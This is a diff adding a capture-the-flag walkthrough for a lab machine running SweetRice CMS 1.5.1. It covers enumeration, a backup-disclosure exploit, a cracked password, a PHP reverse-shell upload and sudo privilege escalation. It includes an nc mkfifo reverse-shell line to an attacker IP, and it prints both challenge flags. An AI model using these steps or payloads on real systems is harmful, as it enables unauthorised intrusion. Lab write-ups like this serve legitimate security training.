@@ -1,0 +1,92 @@
+# IP ADDRESS
+```
+10.10.242.49
+```
+
+# OPEN PORTS
+
+```
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
+80/tcp open  http    Apache httpd 2.4.18
+
+```
+
+http://10.10.242.49/
+
+gobuster/dirb time
+
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.242.49/
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.242.49/  
+
+/content
+
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.242.49/content/
+
+http://10.10.242.49/content/inc/
+
+CMS SweetRice for website management 
+
+searchsploit sweetrice
+
+SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code  | php/webapps/40700.html
+SweetRice 1.5.1 - Backup Disclosure                      | php/webapps/40718.txt
+
+http://10.10.242.49/content/inc/ - after heading here 'latest.txt' states that 1.5.1 sweetrice is running. 
+
+# Exploit 1: 
+
+searchsploit -m  php/webapps/40718.txt [-m to copy to current dir]
+
+viewing the .txt states that we have access to this dir: You can access to all mysql backup and download them from this directory.
+http://localhost/inc/mysql_backup
+
+http://10.10.242.49/content/inc/mysql_backup/ - there is an mysql_bakup_20191129023059-1.5.1.sql -> download it and open in text editor and look for any information:
+
+User: manager
+Pass: 42f749ade7f9e195bf475f37a44cafcb - crackstation - Password123
+
+now we can ssh - unable to ssh not credentials - looks like creds for SweetRice manager - on gobuster http://10.10.242.49/content/as/]
+
+# Exploit 2: [SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code  | php/webapps/40700.html]
+
+we can see that we can use php codes inside of the Ad directory. let's find a reverse php shell [Pentest monkey is a good tool]
+
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php - paste the code in the Ad area and setup 'netcat'
+
+reverseshell to user 
+
+# TASK 1: What is the user flag?
+```
+THM{63e5bce9271952aad1113b6f1ac28a07}
+```
+# TASK 2: What is the root flag?
+
+sudo -l 
+
+sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+The backup.pl file is running a script called copy.sh - copy.sh has a revershe shell into it. 
+
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.45.223 5554 >/tmp/f' >/etc/copy.sh
+
+netcat on attacker machine
+
+comp machine run -> sudo /usr/bin/perl /home/itguy/backup.pl
+
+reverseshell to root should connect
+
+listening on [any] 5554 ...
+connect to [10.6.45.223] from (UNKNOWN) [10.10.242.49] 50876
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cat /root/root.txt
+```
+THM{6637f41d0177b6f37cb20d775124699f}
+```
